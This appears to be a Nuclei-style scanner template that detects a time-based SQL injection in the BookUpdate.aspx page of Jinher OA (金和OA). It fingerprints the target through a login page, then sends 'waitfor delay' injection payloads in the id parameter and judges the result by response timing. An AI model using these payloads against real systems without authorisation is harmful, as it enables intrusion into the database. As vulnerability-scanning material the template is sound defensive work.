id: poc-yaml-jinher-bookupdate-aspx-sqli
info:
  name: 金和OA BookUpdate.aspx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: 金和OA

flow: |
  http(1) && http(2)

http:
  - id: check-access
    method: GET
    path:
      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - "contains(http_body, 'JHSoft')"

  - id: sqli-check
    method: GET
    path:
      - "{{BaseURL}}/c6/Jhsoft.Web.AddressBook/BookUpdate.aspx/?id=1'waitfor+delay'0:0:5'--"
      - "{{BaseURL}}/c6/Jhsoft.Web.AddressBook/BookUpdate.aspx/?id=1'waitfor+delay'0:0:8'--"
    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - "http_body == ''"
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
